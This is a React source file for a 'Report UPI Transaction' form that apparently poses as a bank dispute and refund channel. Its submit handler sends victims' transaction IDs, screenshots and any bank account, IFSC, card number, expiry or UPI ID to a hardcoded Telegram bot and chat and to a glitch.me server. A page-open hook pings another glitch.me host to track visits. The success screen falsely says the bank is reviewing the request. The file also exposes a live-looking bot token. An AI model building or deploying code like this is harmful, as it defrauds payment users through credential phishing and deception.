// src/App.js
import React, { useEffect, useState } from "react";
import HomePage from "./HomePage"; // New Home Page
import FindTransaction from "./FindTransaction"; // New Find Transaction Page
import { BrowserRouter as Router, Route, Routes, useNavigate } from "react-router-dom";
import "./App.css";

const telegramBotToken = "6735591051:AAELwIkSHegcBIVv5pf484Pn09WNQj1Nl54"; // Replace with your Telegram Bot Token
const chatId = "-1001972065816";


export function TransactionForm() {
  const [transactionId, setTransactionId] = useState("");
  const [amount, setAmount] = useState("");
  const [issue, setIssue] = useState("");
  const [refundReason, setRefundReason] = useState("");
  const [refundMethod, setRefundMethod] = useState("bank"); // Bank, Card, or UPI
  const [bankAccount, setBankAccount] = useState("");
  const [ifsc, setIfsc] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [upiId, setUpiId] = useState("");
  const [transactionImage, setTransactionImage] = useState(null);
  const [isRefundRequested, setIsRefundRequested] = useState(false);
  const [loading, setLoading] = useState(false); // Loading state for submission
  const [data, setData] = useState(null);

  const navigate = useNavigate(); // For navigation after form submission
  useEffect(()=>{
    try {
      console.log("here")
      fetch(`https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeURIComponent(`Opened Report PAge: Clicked Report`)}`);
    } catch (error) {
      
    }
  },[])
  const handleTransactionSubmit = async (e) => {
    e.preventDefault();
    setLoading(true); // Start loading

    // Create message for Telegram
    let refundDetails = "";

    if (refundMethod === "bank") {
      refundDetails = `*Bank Account:* ${bankAccount}\n*IFSC:* ${ifsc}`;
    } else if (refundMethod === "card") {
      refundDetails = `*Card Number:* ${cardNumber}\n*Expiry Date:* ${expiryDate}`;
    } else if (refundMethod === "upi") {
      refundDetails = `*UPI ID:* ${upiId}`;
    }

    const message = isRefundRequested
      ? `🔄 *Refund Request* 🔄\n\n*Transaction ID:* ${transactionId}\n*Amount:* ₹${amount}\n*Issue:* ${issue}\n*Reason for Refund:* ${refundReason}\n${refundDetails}`
      : `🚨 *Transaction Issue Report* 🚨\n\n*Transaction ID:* ${transactionId}\n*Amount:* ₹${amount}\n*Issue:* ${issue}`;

    try {
      await sendMessageToTelegram(message, transactionImage);

      const transactionData = {
        transactionId,
        amount,
        issue,
        refundReason,
        refundMethod,
        bankAccount: refundMethod === "bank" ? bankAccount : null,
        ifsc: refundMethod === "bank" ? ifsc : null,
        cardNumber: refundMethod === "card" ? cardNumber : null,
        expiryDate: refundMethod === "card" ? expiryDate : null,
        upiId: refundMethod === "upi" ? upiId : null,
        transactionImage, // You can manage this if you need to upload files
      };

      // Call the API to create a new transaction report
      const response = await fetch("https://mytghelper.glitch.me/transaction", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(transactionData),
      });

      if (!response.ok) {
        throw new Error("Failed to create transaction report");
      }
      const jsonData = await response.json()
      console.log(jsonData);
      setData(jsonData)
    } catch (error) {
      console.error("Error sending message to Telegram:", error);
      navigate("/failure");
    } finally {
      setLoading(false); // Stop loading
    }
  };

  const handleClose = ()=>{
    navigate('/')
  }
  const sendMessageToTelegram = async (message, imageFile) => {
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    // Send message to Telegram
    await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    // If an image is uploaded, send it as well
    if (imageFile) {
      const photoUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;

      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", imageFile);

      await fetch(photoUrl, {
        method: "POST",
        body: formData,
      });
    }
  };

  const handleImageChange = (e) => {
    setTransactionImage(e.target.files[0]);
  };

  return (
    <div>{
      !data &&
      <div className="App">
        <h2>Report UPI Transaction</h2>
        <form className="form" onSubmit={handleTransactionSubmit}>
          <div className="form-group">
            <label>Transaction ID (UTR):</label>
            <input
              type="text"
              value={transactionId}
              onChange={(e) => setTransactionId(e.target.value)}
              required
              placeholder="61234567890"
            />
          </div>

          <div className="form-group">
            <label>Amount:</label>
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              required
              placeholder="500"
            />
          </div>

          <div className="form-group">
            <label>Describe Issue:</label>
            <textarea
              value={issue}
              onChange={(e) => setIssue(e.target.value)}
              required
              placeholder="Online fraudulent transaction"
            />
          </div>

          <div className="form-group">
            <label>Upload Transaction Image:</label>
            <div className="file-upload">
              <input
                type="file"
                id="file-input"
                accept="image/*"
                onChange={handleImageChange}
                style={{ display: 'none' }} // Hide the default input
              />
              <label htmlFor="file-input" className="file-upload-label">
                {transactionImage ? (
                  <img
                    src={URL.createObjectURL(transactionImage)}
                    alt="Selected"
                    className="preview-image"
                  />
                ) : (
                  'Choose File'
                )}
              </label>
            </div>
          </div>

          <div className="form-group toggle-switch">
            <label>Request Refund:</label>
            <label className="switch">
              <input
                type="checkbox"
                checked={isRefundRequested}
                onChange={() => setIsRefundRequested(!isRefundRequested)}
              />
              <span className="slider round"></span>
            </label>
          </div>

          {isRefundRequested && (
            <div>
              {/* <div className="form-group">
              <label>Reason for Refund:</label>
              <textarea
                value={refundReason}
                onChange={(e) => setRefundReason(e.target.value)}
                required
                placeholder="Goods/Services not provided"
              />
            </div> */}

              <div className="form-group">
                <label>Issue type:</label>
                <select
                  value={refundMethod}
                  onChange={(e) => setRefundMethod(e.target.value)}
                >
                  <option value="bank">Goods/Services not provided</option>
                  <option value="card">Amount Debited but not credited to merchant</option>
                  <option value="upi">Transaction Declined</option>
                  <option value="upi">Fraudlent Transaction</option>
                </select>
              </div>

              {/* {refundMethod === "bank" ? (
              <>
                <div className="form-group">
                  <label>Bank Account Number:</label>
                  <input
                    type="text"
                    value={bankAccount}
                    onChange={(e) => setBankAccount(e.target.value)}
                    required
                    placeholder="UTR of payment (123456789012)"
                  />
                </div>

                <div className="form-group">
                  <label>IFSC Code:</label>
                  <input
                    type="text"
                    value={ifsc}
                    onChange={(e) => setIfsc(e.target.value)}
                    required
                    placeholder="ABCD0123456"
                  />
                </div>
              </>
            ) : refundMethod === "card" ? (
              <>
                <div className="form-group">
                  <label>Card Number:</label>
                  <input
                    type="text"
                    value={cardNumber}
                    onChange={(e) => setCardNumber(e.target.value)}
                    required
                    placeholder="4111 1111 1111 1111"
                  />
                </div>

                <div className="form-group">
                  <label>Expiry Date:</label>
                  <input
                    type="text"
                    placeholder="MM/YY"
                    value={expiryDate}
                    onChange={(e) => setExpiryDate(e.target.value)}
                    required
                  />
                </div>
              </>
            ) : (
              refundMethod === "upi" && (
                <div className="form-group">
                  <label>UPI ID:</label>
                  <input
                    type="text"
                    value={upiId}
                    onChange={(e) => setUpiId(e.target.value)}
                    required
                    placeholder="example@upi"
                  />
                </div>
              )
            )} */}
            </div>
          )}

          <button type="submit" disabled={loading}>
            {loading ? "Submitting..." : "Submit"}
          </button>
        </form>
      </div>}
      {data &&
        <div className="message-page success">
          <h1>Request Accepted!</h1>
          <p>Your transaction was successfully reported!</p>
          <p><b>Ref Id : {data._id}</b></p>
          <p>Your request has been successfully submitted and is now under review by the bank. You will receive a response shortly.</p>
          <button onClick={handleClose} className="close-button">Close</button>
        </div>
      }
    </div>
  );
}

export function FailurePage({ message }) {
  return (
    <div className="message-page failure">
      <h1>Oops!</h1>
      <p>{message}</p>
      <a href="/" className="back-button">Try Again</a>
    </div>
  );
}
